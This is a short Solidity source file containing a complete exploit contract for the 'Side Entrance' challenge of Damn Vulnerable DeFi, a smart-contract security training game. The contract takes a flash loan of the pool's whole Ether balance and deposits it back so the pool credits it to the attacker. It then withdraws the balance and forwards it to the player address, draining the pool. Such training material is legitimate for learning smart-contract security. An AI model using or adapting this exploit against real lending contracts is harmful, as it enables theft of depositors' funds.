// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public f;
    address public player;

    constructor(address _f) {
        f = SideEntranceLenderPool(_f);
        player = msg.sender;
    }

    function attack() public {
        f.flashLoan(address(f).balance);
        f.withdraw();
    }

    function execute() external payable {
        f.deposit{value: msg.value}();
    }

    receive() external payable {
        payable(player).transfer(msg.value);
    }
}
